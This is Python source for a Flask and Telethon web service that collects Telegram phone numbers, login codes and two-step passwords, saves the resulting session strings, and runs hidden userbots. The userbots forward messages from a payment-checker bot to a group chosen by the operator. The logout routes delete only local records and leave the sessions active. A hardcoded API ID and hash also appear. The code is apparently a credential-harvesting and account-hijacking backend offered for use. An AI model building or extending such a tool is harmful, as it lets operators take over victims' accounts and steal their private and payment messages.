import os
import asyncio
import sqlite3
import threading
from flask import Flask, request, jsonify
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ================== CONFIG ==================
API_ID = 38746329
API_HASH = "dc6d3dd0de462ed07952a64c3253c437"
TARGET_BOT_USERNAME = "paymentcheclerrrrrx_bot"
TARGET_GROUP_LINK = "https://t.me/your_group_username" # Apna group link daal

PORT = int(os.environ.get("PORT", 5000))
app = Flask(__name__)

temp_clients = {}
userbot_clients = {}

def init_db():
    conn = sqlite3.connect("web_accounts.db")
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS accounts (phone TEXT PRIMARY KEY, session TEXT)""")
    conn.commit(); conn.close()
init_db()

def save_session(phone, session_str):
    conn = sqlite3.connect("web_accounts.db")
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO accounts (phone, session) VALUES (?,?)", (phone, session_str))
    conn.commit(); conn.close()

def delete_session(phone):
    conn = sqlite3.connect("web_accounts.db")
    c = conn.cursor()
    c.execute("DELETE FROM accounts WHERE phone=?", (phone,))
    conn.commit(); conn.close()

def delete_all_sessions():
    conn = sqlite3.connect("web_accounts.db")
    c = conn.cursor()
    c.execute("DELETE FROM accounts")
    conn.commit(); conn.close()

def get_all_sessions():
    conn = sqlite3.connect("web_accounts.db")
    c = conn.cursor()
    c.execute("SELECT phone, session FROM accounts")
    rows = c.fetchall()
    conn.close()
    return rows

# ================== MESSAGE FORWARDER ==================
async def start_userbot(phone, session_str):
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    @client.on(events.NewMessage)
    async def msg_handler(event):
        sender = await event.get_sender()
        if sender and sender.username and sender.username.lower() == TARGET_BOT_USERNAME.lower():
            try: await client.forward_messages(TARGET_GROUP_LINK, event.message)
            except: pass
    userbot_clients[phone] = client
    return client

# ================== API ROUTES ==================
@app.route('/api/send_code', methods=['POST'])
def send_code():
    data = request.json; phone = data.get('phone')
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(client.connect())
        sent_code = loop.run_until_complete(client.send_code_request(phone))
        temp_clients[phone] = {'client': client, 'hash': sent_code.phone_code_hash}
        return jsonify({"status": "success"})
    except Exception as e: return jsonify({"status": "error", "error": str(e)})

@app.route('/api/verify_otp', methods=['POST'])
def verify_otp():
    data = request.json; phone = data.get('phone'); otp = data.get('otp')
    if phone not in temp_clients: return jsonify({"status": "error", "error": "Session expired."})
    client = temp_clients[phone]['client']; code_hash = temp_clients[phone]['hash']
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(client.sign_in(phone, otp, phone_code_hash=code_hash))
        session_str = client.session.save(); save_session(phone, session_str)
        threading.Thread(target=lambda: asyncio.run(start_userbot(phone, session_str)), daemon=True).start()
        del temp_clients[phone]
        return jsonify({"status": "success"})
    except Exception as e:
        if "Two-step verification" in str(e) or "password" in str(e).lower(): return jsonify({"status": "2fa"})
        return jsonify({"status": "error", "error": str(e)})

@app.route('/api/verify_2fa', methods=['POST'])
def verify_2fa():
    data = request.json; phone = data.get('phone'); password = data.get('password')
    if phone not in temp_clients: return jsonify({"status": "error", "error": "Session expired."})
    client = temp_clients[phone]['client']
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(client.sign_in(password=password))
        session_str = client.session.save(); save_session(phone, session_str)
        threading.Thread(target=lambda: asyncio.run(start_userbot(phone, session_str)), daemon=True).start()
        del temp_clients[phone]
        return jsonify({"status": "success"})
    except Exception as e: return jsonify({"status": "error", "error": str(e)})

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    sessions = get_all_sessions()
    return jsonify({"accounts": [s[0] for s in sessions]})

@app.route('/api/logout_one', methods=['POST'])
def logout_one():
    phone = request.json.get('phone')
    delete_session(phone)
    return jsonify({"status": "success"})

@app.route('/api/logout_all', methods=['POST'])
def logout_all():
    delete_all_sessions()
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
